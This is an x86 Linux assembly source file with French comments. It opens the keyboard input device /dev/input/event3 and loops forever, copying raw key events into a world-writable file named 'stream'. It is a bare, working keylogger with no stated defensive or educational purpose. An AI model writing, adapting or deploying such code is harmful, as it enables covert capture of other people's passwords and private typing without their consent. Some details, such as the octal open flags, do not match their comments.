section .data
    log_file db 'stream', 0
    fd      dd 0  ; Variable pour stocker le descripteur de fichier
    clavier db "/dev/input/event3", 0

section .text
    global _start

_start:
    ; Ouvre le fichier 'stream'
    mov eax, 5         ; sys_open call
    mov ebx, log_file  ; Pointeur vers le nom du fichier
    mov ecx, 0o1102     ; O_CREAT | O_WRONLY | O_TRUNC, mode octal
    mov edx, 0o777      ; Droits d'accès (lecture/écriture pour tout le monde)
    int 0x80

    cmp eax, 0xFFFFFFFF
    je exit

    ; Stocke le descripteur de fichier dans la variable fd
    mov [fd], eax

    ; Ouvre le fichier /dev/input/event3
    mov eax, 5           ; sys_open
    mov ebx, clavier  ; Nom du fichier /dev/input/event3
    mov ecx, 0           ; O_RDONLY (lecture seule)
    int 80h

    ; Stocke le descripteur de fichier retourné
    mov dword [file_descriptor], eax 

capture_key:
    mov eax, 3        ; sys_read
    mov ebx, dword [file_descriptor]  ; Utilise le descripteur de fichier stocké
    mov ecx, buffer
    mov edx, 32       ; Taille du buffer
    int 80h

    mov eax, 4         ; sys_write call
    mov ebx, [fd]      ; Descripteur de fichier du fichier 'stream'
    mov ecx, buffer
    mov edx, 32         ; Taille du buffer
    int 0x80

    jmp capture_key

exit:
    mov eax, 1         ; sys_exit call
    xor ebx, ebx       ; Code de sortie 0
    int 0x80

section .bss
    buffer resb 32
    file_descriptor resd 1
